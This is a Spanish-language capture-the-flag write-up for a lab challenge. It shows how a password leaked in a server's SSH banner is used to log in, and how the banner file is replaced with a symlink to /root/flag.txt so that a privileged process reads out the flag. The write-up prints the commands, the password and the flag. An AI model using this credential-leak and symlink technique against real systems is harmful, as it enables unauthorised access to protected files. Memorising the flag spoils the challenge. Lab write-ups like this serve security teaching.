### Descripción
Can you abuse the banner? The server has been leaking some crucial information on `xebec.cylabacademy.net 35159`. Use the leaked information to get to the server.

To connect to the running application use `nc xebec.cylabacademy.net 40645`. From the above information abuse the machine and find the flag in the /root directory.
Hints: 
- Do you know about symlinks?
- Maybe some small password cracking or guessing
### Solución
1. Conectarse con nc al primer servidor que nos dan para obtener la contraseña, en mi caso:
```
~ took 13s 
➜ nc xebec.cylabacademy.net 35159
SSH-2.0-OpenSSH_9.6p1 My_Passw@rd_@1234
```

2. Ahora que tenemos la contraseña hay que ingresar al segundo servidor, ingresar la contraseña y contestar las preguntas que nos hagan: 
```
	~ took 10s 
➜ nc xebec.cylabacademy.net 40645
*************************************
**************WELCOME****************
*************************************

what is the password? 
My_Passw@rd_@1234
What is the top cyber security conference in the world?
RSA
Lol, good try, try again and good luck

What is the top cyber security conference in the world?
DEF CON
the first hacker ever was known for phreaking(making free phone calls), who was it?
John Thomas Draper
player@challenge:~$ ls
ls
banner	text
```

3. Una vez dentro vemos que hay un banner y al hacerle cat es el mismo banner que sale al principio:
```
player@challenge:~$ cat banner
cat banner
*************************************
**************WELCOME****************
*************************************
```

4. Hay que borrarlo y crear el enlace simbólico apuntando a la bandera del root:
```
player@challenge:~$ rm /home/player/banner
rm /home/player/banner
player@challenge:~$ ln -s /root/flag.txt /home/player/banner
ln -s /root/flag.txt /home/player/banner
```

5. Salimos del servidor con Ctrl + C
6. Hay que volver a conectarse al servidor al que acabamos de salirnos y en luagr del banner saldrá la flag:
```
~ took 7m36s 
❯ nc xebec.cylabacademy.net 40645
academy{b4nn3r_gr4bb1n9_su((3sfu11y_1aa2e989}
```

**Flag**: academy{b4nn3r_gr4bb1n9_su((3sfu11y_1aa2e989}
### Notas Adicionales

### Referencias